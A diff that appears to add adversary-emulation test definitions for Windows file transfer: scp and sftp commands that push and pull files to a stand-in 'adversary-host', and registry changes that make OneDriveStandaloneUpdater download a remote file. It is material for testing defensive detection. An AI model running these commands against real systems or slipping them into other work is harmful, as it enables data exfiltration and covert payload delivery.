@@ -976,3 +976,296 @@ atomic_tests:
       del /f /q #{exfil_package}
     name: command_prompt
     elevation_required: false
+- name: Windows push file using scp.exe
+  auto_generated_guid: 2a4b0d29-e5dd-4b66-b729-07423ba1cd9d
+  description: |
+    This test simulates pushing files using SCP on a Windows environment.
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_path:
+      description: Path of folder to copy
+      type: path
+      default: /tmp/
+    remote_host:
+      description: Remote host to send 
+      type: string
+      default: adversary-host
+    local_path:
+      description: Local path to copy from
+      type: path
+      default: C:\temp
+    file_name:
+      description: Name of the file to transfer
+      type: string
+      default: T1105.txt
+    username:
+      description: User account to authenticate on remote host
+      type: string
+      default: adversary
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        This test requires the `scp` command to be available on the system.
+      prereq_command: |
+        if (Get-Command scp -ErrorAction SilentlyContinue) {
+            Write-Output "SCP command is available."
+            exit 0
+        } else {
+            Write-Output "SCP command is not available."
+            exit 1
+        }
+
+      get_prereq_command: |
+        # Define the capability name for OpenSSH Client
+        $capabilityName = "OpenSSH.Client~~~~0.0.1.0"
+        try {
+            # Install the OpenSSH Client capability
+            Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+            Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
+        } catch {
+            # Handle any errors that occur during the installation process
+            Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
+        }
+  executor:
+    elevation_required: true
+    name: powershell
+    command: |
+      # Check if the folder exists, create it if it doesn't
+      $folderPath = "#{local_path}"
+      if (-Not (Test-Path -Path $folderPath)) {
+          New-Item -Path $folderPath -ItemType Directory
+      }
+
+      # Create the file
+      $filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"
+      New-Item -Path $filePath -ItemType File -Force
+      Write-Output "File created: $filePath"
+
+      # Attack command
+      scp.exe #{local_path}\#{file_name} #{username}@#{remote_host}:#{remote_path}
+    cleanup_command: |
+      $filePath = Join-Path -Path "#{local_path}" -ChildPath "#{file_name}"
+      Remove-Item -Path $filePath -Force -erroraction silentlycontinue
+      Write-Output "File deleted: $filePath"
+
+- name: Windows pull file using scp.exe
+  auto_generated_guid: 401667dc-05a6-4da0-a2a7-acfe4819559c
+  description: |
+    This test simulates pulling files using SCP on a Windows environment.
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_path:
+      description: Path of folder to pull
+      type: path
+      default: /tmp/T1105.txt
+    remote_host:
+      description: Remote host to pull from 
+      type: string
+      default: adversary-host
+    local_path:
+      description: Local path to receive files
+      type: path
+      default: C:\temp
+    username:
+      description: User account to authenticate on remote host
+      type: string
+      default: adversary
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        This test requires the `scp` command to be available on the system.
+      prereq_command: |
+        if (Get-Command scp -ErrorAction SilentlyContinue) {
+            Write-Output "SCP command is available."
+            exit 0
+        } else {
+            Write-Output "SCP command is not available."
+            exit 1
+        }
+
+      get_prereq_command: |
+        # Define the capability name for OpenSSH Client
+        $capabilityName = "OpenSSH.Client~~~~0.0.1.0"
+        try {
+            # Install the OpenSSH Client capability
+            Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+            Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
+        } catch {
+            # Handle any errors that occur during the installation process
+            Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
+        }
+  executor:
+    elevation_required: true
+    name: powershell
+    command: |
+      scp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
+
+- name: Windows push file using sftp.exe
+  auto_generated_guid: 205e676e-0401-4bae-83a5-94b8c5daeb22
+  description: |
+    This test simulates pushing files using SFTP on a Windows environment.
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_path:
+      description: Path of folder to copy
+      type: path
+      default: /tmp
+    remote_host:
+      description: Remote host to send 
+      type: string
+      default: adversary-host
+    local_path:
+      description: Local path to receive sftp
+      type: path
+      default: C:\temp
+    file_name:
+      description: Name of the file to transfer
+      type: string
+      default: T1105.txt
+    username:
+      description: User account to authenticate on remote host
+      type: string
+      default: adversary
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        This test requires the `sftp` command to be available on the system.
+      prereq_command: |
+        if (Get-Command sftp -ErrorAction SilentlyContinue) {
+            Write-Output "SFTP command is available."
+            exit 0
+        } else {
+            Write-Output "SFTP command is not available."
+            exit 1
+        }
+      get_prereq_command: |
+        # Define the capability name for OpenSSH Client
+        $capabilityName = "OpenSSH.Client~~~~0.0.1.0"
+        try {
+            # Install the OpenSSH Client capability
+            Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+            Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
+        } catch {
+            # Handle any errors that occur during the installation process
+            Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
+        }
+  executor:
+    elevation_required: true
+    name: powershell
+    command: |
+      # Check if the folder exists, create it if it doesn't
+      $folderPath = "#{local_path}"
+      if (-Not (Test-Path -Path $folderPath)) {
+          New-Item -Path $folderPath -ItemType Directory
+      }
+      # Create the file
+      $filePath = Join-Path -Path $folderPath -ChildPath "#{file_name}"
+      New-Item -Path $filePath -ItemType File -Force
+      Write-Output "File created: $filePath"
+      # Attack command
+      echo "put #{local_path}\#{file_name}" | sftp #{username}@#{remote_host}:#{remote_path}
+    cleanup_command: |
+      $filePath = Join-Path -Path "#{local_path}" -ChildPath "#{file_name}"
+      Remove-Item -Path $filePath -Force
+      Write-Output "File deleted: $filePath"
+
+- name: Windows pull file using sftp.exe
+  auto_generated_guid: 3d25f1f2-55cb-4a41-a523-d17ad4cfba19
+  description: |
+    This test simulates pulling files using SFTP on a Windows environment.
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_path:
+      description: Path of file to pull
+      type: path
+      default: /tmp/T1105.txt
+    remote_host:
+      description: Remote host to pull from 
+      type: string
+      default: adversary-host
+    local_path:
+      description: Local path to receive files
+      type: path
+      default: C:\temp
+    username:
+      description: User account to authenticate on remote host
+      type: string
+      default: adversary
+  dependency_executor_name: powershell
+  dependencies:
+    - description: |
+        This test requires the `sftp` command to be available on the system.
+      prereq_command: |
+        if (Get-Command sftp -ErrorAction SilentlyContinue) {
+            Write-Output "SFTP command is available."
+            exit 0
+        } else {
+            Write-Output "SFTP command is not available."
+            exit 1
+        }
+      get_prereq_command: |
+        # Define the capability name for OpenSSH Client
+        $capabilityName = "OpenSSH.Client~~~~0.0.1.0"
+        try {
+            # Install the OpenSSH Client capability
+            Add-WindowsCapability -Online -Name $capabilityName -ErrorAction Stop
+            Write-Host "OpenSSH Client has been successfully installed." -ForegroundColor Green
+        } catch {
+            # Handle any errors that occur during the installation process
+            Write-Host "An error occurred while installing OpenSSH Client: $_" -ForegroundColor Red
+        }
+  executor:
+    elevation_required: true
+    name: powershell
+    command: |
+      sftp.exe #{username}@#{remote_host}:#{remote_path} #{local_path}
+- name: Download a file with OneDrive Standalone Updater
+  auto_generated_guid: 3dd6a6cf-9c78-462c-bd75-e9b54fc8925b
+  description: |
+    Uses OneDrive Standalone Updater to download a file from a specified URL by setting up the required registry keys.
+    This technique can be used to download files without executing anomalous executables.
+    Reference: https://lolbas-project.github.io/lolbas/Binaries/OneDriveStandaloneUpdater/
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: URL to download file from
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    onedrive_path:
+      description: Path to OneDrive Standalone Updater executable
+      type: path
+      default: 'C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      OneDriveStandaloneUpdater.exe must exist on disk at specified location
+    prereq_command: |
+      if (Test-Path "#{onedrive_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host "OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Please install OneDrive or specify correct path."
+  executor:
+    command: |
+      if (-not (Test-Path "#{onedrive_path}")) {
+          Write-Host "OneDriveStandaloneUpdater.exe not found at #{onedrive_path}. Test cannot continue."
+          exit 1
+      }
+
+      New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force | Out-Null
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateRingSettingURLFromOC" -Value "#{remote_url}" -Type String -Force
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "ODSUUpdateXMLUrlFromOC" -Value "#{remote_url}" -Type String -Force
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateXMLUrlFromOC" -Value "#{remote_url}" -Type String -Force
+      Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force
+      
+      # Run OneDrive Standalone Updater
+      & "#{onedrive_path}"
+    cleanup_command: |
+      Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force -ErrorAction Ignore
+      Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json" -Force -ErrorAction Ignore
+
+    name: powershell
+    elevation_required: false
